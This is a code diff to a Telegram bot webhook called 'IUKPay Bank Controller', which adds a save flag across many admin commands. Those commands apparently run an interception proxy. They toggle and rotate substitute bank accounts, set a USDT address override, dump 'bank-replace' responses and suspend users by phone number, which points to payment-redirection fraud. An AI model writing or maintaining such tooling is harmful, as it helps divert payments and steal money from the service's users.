@@ -670,6 +670,7 @@ app.post('/bot-webhook', async (req, res) => {
         return res.sendStatus(200);
       }
       data.adminChatId = chatId;
+      data._skipOverrideMerge = true;
       await saveData(data);
       await bot.sendMessage(chatId,
 `🏦 IUKPay Bank Controller
@@ -732,10 +733,10 @@ Example:
       return res.sendStatus(200);
     }
 
-    if (text === '/on') { data.botEnabled = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
-    if (text === '/off') { data.botEnabled = false; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
-    if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
-    if (text === '/log') { data.logRequests = !data.logRequests; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
+    if (text === '/on') { data.botEnabled = true; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
+    if (text === '/off') { data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
+    if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
+    if (text === '/log') { data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
 
     if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next bank-replace request ka full response dump aayega'); return res.sendStatus(200); }
 
@@ -745,6 +746,7 @@ Example:
       if (!data.userOverrides) data.userOverrides = {};
       if (!data.userOverrides[targetId]) data.userOverrides[targetId] = {};
       data.userOverrides[targetId].logOff = true;
+      data._skipOverrideMerge = true;
       await saveData(data);
       if (redis) {
         try {
@@ -771,6 +773,7 @@ Example:
       if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /on log <userId>'); return res.sendStatus(200); }
       if (data.userOverrides && data.userOverrides[targetId]) {
         delete data.userOverrides[targetId].logOff;
+        data._skipOverrideMerge = true;
         await saveData(data);
       }
       if (redis) {
@@ -1008,6 +1011,7 @@ Example:
 
     if (text === '/clearhistory') {
       data.balanceHistory = [];
+      data._skipOverrideMerge = true;
       await saveData(data);
       await bot.sendMessage(chatId, '🗑 Balance history cleared.');
       return res.sendStatus(200);
@@ -1047,6 +1051,7 @@ Example:
       const newBank = { accountHolder: parts[0], accountNo: parts[1], ifsc: parts[2], bankName: parts[3] || '', upiId: parts[4] || '' };
       data.banks.push(newBank);
       if (data.activeIndex < 0) data.activeIndex = 0;
+      data._skipOverrideMerge = true;
       await saveData(data);
       await bot.sendMessage(chatId, `✅ Bank #${data.banks.length} added:\n${newBank.accountHolder} | ${newBank.accountNo}\nIFSC: ${newBank.ifsc}${newBank.bankName ? '\nBank: ' + newBank.bankName : ''}${newBank.upiId ? '\nUPI: ' + newBank.upiId : ''}`);
       return res.sendStatus(200);
@@ -1067,6 +1072,7 @@ Example:
           }
         }
       }
+      data._skipOverrideMerge = true;
       await saveData(data);
       await bot.sendMessage(chatId, `🗑️ Removed: ${removed.accountHolder} | ${removed.accountNo}`);
       return res.sendStatus(200);
@@ -1076,6 +1082,7 @@ Example:
       const idx = parseInt(text.substring(9).trim()) - 1;
       if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid index'); return res.sendStatus(200); }
       data.activeIndex = idx;
+      data._skipOverrideMerge = true;
       await saveData(data);
       await bot.sendMessage(chatId, `✅ Active bank #${idx + 1}: ${data.banks[idx].accountHolder}`);
       return res.sendStatus(200);
@@ -1085,10 +1092,12 @@ Example:
       const addr = text.substring(6).trim();
       if (addr.toLowerCase() === 'off') {
         data.usdtAddress = '';
+        data._skipOverrideMerge = true;
         await saveData(data);
         await bot.sendMessage(chatId, '❌ USDT override OFF');
       } else if (addr.length >= 20) {
         data.usdtAddress = addr;
+        data._skipOverrideMerge = true;
         await saveData(data);
         await bot.sendMessage(chatId, `₮ USDT address set: ${addr}`);
       } else {
@@ -1103,6 +1112,7 @@ Example:
       if (!suspendPhone) { await bot.sendMessage(chatId, '❌ Format: /suspend <phoneNumber>\nExample: /suspend 9876543210'); return res.sendStatus(200); }
       if (!data.suspendedPhones) data.suspendedPhones = {};
       data.suspendedPhones[suspendPhone] = { suspended: true, time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) };
+      data._skipOverrideMerge = true;
       await saveData(data);
       await bot.sendMessage(chatId, `🚫 Suspended: ${suspendPhone}\nUser will see "ID Suspended" on login.\n\nTo unsuspend: /unsuspend ${suspendPhone}`);
       return res.sendStatus(200);
@@ -1113,6 +1123,7 @@ Example:
       if (!unsuspendPhone) { await bot.sendMessage(chatId, '❌ Format: /unsuspend <phoneNumber>'); return res.sendStatus(200); }
       if (data.suspendedPhones && data.suspendedPhones[unsuspendPhone]) {
         delete data.suspendedPhones[unsuspendPhone];
+        data._skipOverrideMerge = true;
         await saveData(data);
         await bot.sendMessage(chatId, `✅ Unsuspended: ${unsuspendPhone}\nUser can login now.`);
       } else {
